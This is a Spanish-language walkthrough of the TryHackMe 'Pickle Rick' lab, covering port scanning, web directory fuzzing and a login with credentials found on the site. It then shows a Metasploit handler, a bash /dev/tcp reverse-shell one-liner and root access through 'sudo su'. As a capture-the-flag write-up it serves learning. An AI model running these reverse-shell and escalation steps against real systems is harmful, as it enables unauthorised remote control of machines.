---
tags:
  - Cybersecurity
  - Labs
  - TryHackMe
  - Easy
  - Linux
  - HTTP
  - ReverseShell
  - PrivilegeEscalation
  - Sudo
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Ping|Ping]]
	- [[#Enumeración#Nmap|Nmap]]
	- [[#Enumeración#HTTP|HTTP]]
		- [[#HTTP#Fuzzing Web|Fuzzing Web]]
- [[#Explotación|Explotación]]
	- [[#Explotación#Reverse Shell|Reverse Shell]]
	- [[#Explotación#Escalada de Privilegios|Escalada de Privilegios]]
		- [[#Escalada de Privilegios#Sudo|Sudo]]

---
# Resolviendo la máquina Pickle Rick

>En esta publicación, comparto cómo resolví la máquina **Pickle Rick** de [TryHackMe](https://tryhackme.com/room/picklerick).

---
## Enumeración
### Ping

Ejecutamos un *ping* para comprobar la conectividad y obtener pistas sobre el sistema operativo.

`ping -c 1 10.10.94.237`

![[Pasted image 20250723181451.png]]

*TTL=63* -> **Linux**
### Nmap

`nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.94.237 -oG allPorts`

![[Pasted image 20250723181605.png]]

`nmap -p22,80 -sCV 10.10.94.237 -oN targeted`

![[Pasted image 20250723181640.png]]
### HTTP

`http://10.10.94.237/index.html`

![[Pasted image 20250723181725.png]]

![[Pasted image 20250723181759.png]]
#### Fuzzing Web

Se realiza **Fuzzing Web**.

`gobuster dir -u http://10.10.94.237/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 64`

![[Pasted image 20250723182213.png]]

`gobuster dir -u http://10.10.94.237/assets/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 64`

![[Pasted image 20250723182228.png]]

`dirb http://10.10.94.237/`

![[Pasted image 20250723182244.png]]

`dirsearch -u http://10.10.94.237/ -t 50 -i 200`

![[Pasted image 20250723182259.png]]

Se encuentran los siguientes directorios:
- `/assets/`.
- `/robotx.txt`.
- `/login.php`.

`http://10.10.94.237/assets/`

![[Pasted image 20250723182520.png]]

`http://10.10.94.237/robots.txt`

![[Pasted image 20250723182459.png]]

`http://10.10.94.237/login.php`

![[Pasted image 20250723210727.png]]

Se prueba con el usuario encontrado anteriormente en `index.html` (`R1ckRul3s`) y la contraseña descubierta en `robots.txt` (`Wubbalubbadubdub`).

---
## Explotación
### Reverse Shell

![[Pasted image 20250723211009.png]]

Se observa que tiene un bloque para algunos comandos.

Se realiza una *reverse shell*, [Reverse Shell Generator](https://www.revshells.com/).

![[Pasted image 20250723182922.png]]

Se inicia una escucha en el puerto 1234 para recibir la *reverse shell*.

`vin handler.rc`

```
use multi/handler
set PAYLOAD windows/shell/reverse_tcp
set LHOST 192.168.1.127
set LPORT 1234
run
```

`msfconsole -r handler.rc`

`bash -c "sh -i >& /dev/tcp/10.8.184.124/1234 0>&1"`

![[Pasted image 20250723183031.png]]

`background`

`sessions -u 1`

`sessions 2`

`sysinfo`

![[Pasted image 20250723183159.png]]

`getuid`

![[Pasted image 20250723183213.png]]

`ls`

![[Pasted image 20250723183352.png]]

Se encuentra el primer ingrediente: `Sup3rS3cretPickl3Ingred.txt`.

Se accede al directorio `/home/rick`.

`cd /home/rick`

`ls`

![[Pasted image 20250723183527.png]]

Se encuentra el segundo ingrediente: `second ingredients`, para poder visualizarlo se utiliza: `cat "second ingredients"`.
### Escalada de Privilegios
#### Sudo

Se ejecuta `sudo -l` y se observa que el usuario tiene permisos para usar `sudo su`. Esto permite escalar privilegios a *root* directamente.

`shell`

`/bin/bash -i`

`sudo -l`

![[Pasted image 20250723183753.png]]

`sudo su`

![[Pasted image 20250723183815.png]]

Se accede al directorio: `/root`.

`ls`

![[Pasted image 20250723183853.png]]

Se encuentra el tercer ingrediente: `3rd.txt`.

---



